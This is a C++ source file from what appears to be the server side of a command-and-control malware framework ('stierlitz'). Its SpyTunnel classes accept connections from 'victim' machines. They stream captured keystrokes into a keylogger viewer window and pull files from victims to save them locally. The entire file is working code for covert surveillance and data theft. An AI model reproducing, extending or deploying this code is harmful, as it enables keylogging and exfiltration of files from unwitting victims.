#include "spy_tunnel.hpp"
#include <sys/eventfd.h>

int SpyTunnel::init(const std::string& __ip, uint __port, int*& __p_tunnel_shutdown_fd, int __connection_type) {    
    memset(&tunnel_addr_, 0, sizeof(tunnel_addr_));
    tunnel_addr_.sin_family = AF_INET;
    tunnel_addr_.sin_port = htons(__port);
    if (inet_pton(AF_INET, __ip.c_str(), &tunnel_addr_.sin_addr) <= 0) {
        return -1;
    }
    tunnel_socket_ = socket(AF_INET, __connection_type, 0);
    if (tunnel_socket_ == -1) {
        return -1;
    }

    int flags = fcntl(tunnel_socket_, F_GETFL, 0);
    fcntl(tunnel_socket_, F_SETFL, flags | O_NONBLOCK);

    int opt = 1;
    setsockopt(tunnel_socket_, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));


    if (bind(tunnel_socket_, (struct sockaddr*)&tunnel_addr_, sizeof(tunnel_addr_)) == -1) {
        close(tunnel_socket_);
        return -1;
    }

    if (listen(tunnel_socket_, 1) == -1) {
        close(tunnel_socket_);
        return -1;
    }
    __p_tunnel_shutdown_fd = &tunnel_shutdown_fd_.fd;

    return 0;
}

// Child process spawning the window
// Parent process will be communicating with the tunnel (victim) and forwarding packets to the fifo
void SpyTunnel::run() {
    pid_ = fork();
    if (pid_ == -1) {
        std::cerr << RED << "[SpyTunnel::run] Error creating child process" << RESET;
        return;
    } else if (pid_ == 0) {
        spawn_window();
        _exit(EXIT_FAILURE);
    }

    int tries = 0;
    while ((tunnel_fifo_ = open(fifo_path_.c_str(), O_WRONLY | O_NONBLOCK)) == -1 && tries++ < 20) {
        std::cout << YELLOW << "[SpyTunnel::run] Waiting for FIFO file to be created..." << RESET;
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
    }

    if (tunnel_fifo_ == -1) {
        std::cerr << RED << "[SpyTunnel::run] Error opening FIFO file" << RESET;
        return;
    }
    
    tunnel_shutdown_fd_.fd = eventfd(0, EFD_NONBLOCK);
    if (tunnel_shutdown_fd_.fd == -1) {
        write_fifo_error("[SpyTunnel::run] Error creating shutdown event file descriptor " + std::string(strerror(errno)));
        return;
    }

    int rc = accept_tunnel_end();
    if (rc < 0) {
        return;
    }

    ScopedEpollFD epoll_fd;
    rc = create_epoll_fd(epoll_fd);
    if (rc < 0) {
        return;
    }
    
    struct epoll_event tunnel_end_event;
    tunnel_end_event.data.fd = tunnel_end_socket_;
    tunnel_end_event.events = EPOLLIN;
    if (epoll_ctl(epoll_fd.fd, EPOLL_CTL_ADD, tunnel_end_socket_, &tunnel_end_event) == -1) {
        write_fifo_error("[SpyTunnel::run] Error adding tunnel end socket to epoll " + std::string(strerror(errno)));
        return;
    }
    
    char buf[BUFFER_SIZE];

    struct epoll_event events[2];
    while (true) {
        int nfds = epoll_wait(epoll_fd.fd, events, 2, -1);
        if (nfds < 0) {
            if (errno == EINTR) {
                continue;
            }
            write_fifo_error("[SpyTunnel::run] Error waiting for epoll event " + std::string(strerror(errno)));
            break;
        }

        for (int i=0;i<nfds;i++) {
            if (events[i].data.fd == tunnel_shutdown_fd_.fd) {
                uint64_t u;
                read(tunnel_shutdown_fd_.fd, &u, sizeof(u));
                std::cout << MAGENTA << "[SpyTunnel::run] Shutdown signal received" << RESET;
                if (tunnel_fifo_ != -1) {
                    write(tunnel_fifo_, RESET_C2_FIFO, strlen(RESET_C2_FIFO));
                    close(tunnel_fifo_);
                }
                return;
            } else if(events[i].data.fd == tunnel_end_socket_) {
                int bytes_read = recv(tunnel_end_socket_, buf, sizeof(buf), 0);
                if (bytes_read < 0) {
                    write_fifo_error("[SpyTunnel::run] Error receiving data from tunnel end socket " + std::string(strerror(errno)));
                    return;
                } else if (bytes_read == 0) {
                    write_fifo_error("[SpyTunnel::run] Tunnel end socket closed by the peer");
                    return;
                } else {
                    write(tunnel_fifo_, buf, bytes_read);
                }
            }
        }
    }

}

int SpyTunnel::accept_tunnel_end() {
    ScopedEpollFD accept_epoll_fd;
    int rc = create_epoll_fd(accept_epoll_fd);
    if (rc < 0) {
        return -1;
    }

    struct epoll_event accept_event;
    accept_event.data.fd = tunnel_socket_;
    accept_event.events = EPOLLIN;
    if (epoll_ctl(accept_epoll_fd.fd, EPOLL_CTL_ADD, tunnel_socket_, &accept_event) == -1) {
        write_fifo_error("[SpyTunnel::accept_tunnel_end] Error adding tunnel socket to epoll " + std::string(strerror(errno)));
        return -1;
    }

    struct epoll_event events[2];
    while (true) {
        int nfds = epoll_wait(accept_epoll_fd.fd, events, 2, -1);
        if (nfds < 0) {
            if (errno == EINTR) {
                continue;
            }
            write_fifo_error("[SpyTunnel::accept_tunnel_end] Error waiting for epoll event " + std::string(strerror(errno)));
            return -1;
        }

        for (int i=0;i<nfds;i++) {
            if (events[i].data.fd == tunnel_shutdown_fd_.fd) {
                uint64_t u;
                read(tunnel_shutdown_fd_.fd, &u, sizeof(u));
                std::cout << MAGENTA << "[SpyTunnel::accept_tunnel_end] Shutdown signal received" << RESET;
                if (tunnel_fifo_ != -1) {
                    write(tunnel_fifo_, RESET_C2_FIFO, strlen(RESET_C2_FIFO));
                    close(tunnel_fifo_);
                }
                return -1;
            } else if (events[i].data.fd == tunnel_socket_) {
                tunnel_end_socket_ = accept(tunnel_socket_, nullptr, nullptr);
                if (tunnel_end_socket_ == -1) {
                    write_fifo_error("[SpyTunnel::accept_tunnel_end] Error accepting tunnel end socket " + std::string(strerror(errno)));
                    return -1;
                }
                epoll_ctl(accept_epoll_fd.fd, EPOLL_CTL_DEL, tunnel_shutdown_fd_.fd, nullptr);
                return 0;
            }
        }
    }
    
    return -1;
}

int SpyTunnel::create_epoll_fd(ScopedEpollFD& __epoll_fd) {
    __epoll_fd.fd = epoll_create1(0);
    if (__epoll_fd.fd == -1) {
        write_fifo_error("[SpyTunnel::create_epoll_fd] Error creating epoll instance " + std::string(strerror(errno)));
        return -1;
    }

    struct epoll_event shutdown_event;
    shutdown_event.data.fd = tunnel_shutdown_fd_.fd;
    shutdown_event.events = EPOLLIN;
    if (epoll_ctl(__epoll_fd.fd, EPOLL_CTL_ADD, tunnel_shutdown_fd_.fd, &shutdown_event) == -1) {
        write_fifo_error("[SpyTunnel::create_epoll_fd] Error adding shutdown eventfd to epoll " + std::string(strerror(errno)));
        return -1;
    }

    return 0;
}



void SpyTunnel::edit_fifo_path(int __client_index, CommandCode __command_code) {
    if (__command_code == KEYLOGGER) {
        fifo_path_ = KEYLOGGER_FIFO_PATH + std::to_string(__client_index);
    }
}

void SpyTunnel::shutdown() {
    if (pid_ > 0) {
        kill(pid_, SIGTERM);
        waitpid(pid_, nullptr, 0);
    }

    if (tunnel_socket_ != -1) {
        close(tunnel_socket_);
    }

    if (tunnel_end_socket_ != -1) {
        close(tunnel_end_socket_);
    }
}

void SpyTunnel::write_fifo_error(const std::string& __msg) {
    if (tunnel_fifo_ != -1) {
        std::string error = __msg + "[__error__]\n";
        write(tunnel_fifo_, error.c_str(), error.length());
    } else {
        std::cerr << RED << "[SpyTunnel::write_fifo_error] " << __msg << RESET;
    }
}

void Keylogger::spawn_window() {
    execlp("urxvt", "urxvt", "-name", "stierlitz_keylogger", "-e", KEYLOGGER_SCRIPT_PATH, fifo_path_.c_str(), (char*)NULL);
}

PacketTunnel::PacketTunnel(const std::string& __file_name, const std::string& __out_name, EventLog* __p_event_log, size_t __limit) 
: file_name_(__file_name), out_name_(__out_name), p_event_log_(__p_event_log), limit_(__limit) {}

void PacketTunnel::run() { // No need for spawning a window. Just receive the file
    tunnel_shutdown_fd_.fd = eventfd(0, EFD_NONBLOCK);
    if (tunnel_shutdown_fd_.fd == -1) {
        write_fifo_error("[SpyTunnel::run] Error creating shutdown event file descriptor " + std::string(strerror(errno)));
        return;
    }


    int rc = accept_tunnel_end();
    if (rc < 0) {
        return;
    }

    // Send the file name first
    rc = send(tunnel_end_socket_, file_name_.c_str(), file_name_.size(), 0);
    if (rc < 0) {
        *p_event_log_ << LOG_MUST << RED << "[PacketTunnel::run] Error while sending the file name: " << strerror(errno) << RESET_C2_FIFO;
        return;
    } else if (rc == 0) {
        *p_event_log_ << LOG_MUST << RED << "[PacketTunnel::run] Peer disconnected while sending file name"<< RESET_C2_FIFO;
        return;
    }

    // Recv the file 
    // **WARNING** this saves the file contents inside the memory until it is done
    // Receiving large files might cause program to act sluggish
    struct timeval timeout;
    timeout.tv_sec = 5;
    timeout.tv_usec = 0;
    setsockopt(tunnel_end_socket_, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));

    ScopedBuf* buf = new ScopedBuf();
    rc = recv_all(tunnel_end_socket_, buf, limit_);
    if (rc <= 0) {
        *p_event_log_ << LOG_MUST << RED << "[PacketTunnel::run] Error while receiving: " << rc << RESET_C2_FIFO;
        delete buf;
        return;
    }

    size_t received = get_total_size(buf);
    *p_event_log_ << LOG_MUST << GREEN << "[PacketTunnel::run] Received with size: " << received << RESET_C2_FIFO;

    // Save the file
    std::ofstream out(out_name_, std::ios::binary);
    if (!out.is_open()) {
        *p_event_log_ << LOG_MUST << RED << "[PacketTunnel::run] Failed to open output file: " << out_name_ << RESET_C2_FIFO;
        delete buf;
        return;
    }

    for (ScopedBuf* current = buf; current != nullptr;current=current->next_) {
        if (current->buf_ && current->len_ > 0) {
            out.write(current->buf_, current->len_);
        }
    }

    out.close();
    *p_event_log_ << LOG_MUST << GREEN << "[PacketTunnel::run] File saved to: " << out_name_ << RESET_C2_FIFO;

    delete buf;
}

Tunnel::Tunnel(int __client_index, CommandCode __command_code, SpyTunnel* __p_spy_tunnel) {
    command_code_ = __command_code;
    client_index_ = __client_index;
    p_spy_tunnel_ = __p_spy_tunnel;
    p_tunnel_shutdown_fd_ = nullptr;
}

std::atomic<int> Tunnel::active_tunnels_ = 0;

void erase_tunnel(std::vector<Tunnel*>* __p_tunnels, int __client_index, CommandCode __command_code) {
    auto it = std::remove_if(
        __p_tunnels->begin(), 
        __p_tunnels->end(),
        [=](Tunnel* tunnel) {
            bool should_erase = (tunnel->client_index_ == __client_index && tunnel->command_code_ == __command_code); 
            if (should_erase) {
                delete tunnel->p_spy_tunnel_;
                delete tunnel;
            }
            return should_erase;
        }
    );

    __p_tunnels->erase(it, __p_tunnels->end()); // Reorganize the vector
}

void SpyTunnel::spawn_window() {
    // Overridden
}

SpyTunnel::~SpyTunnel() {}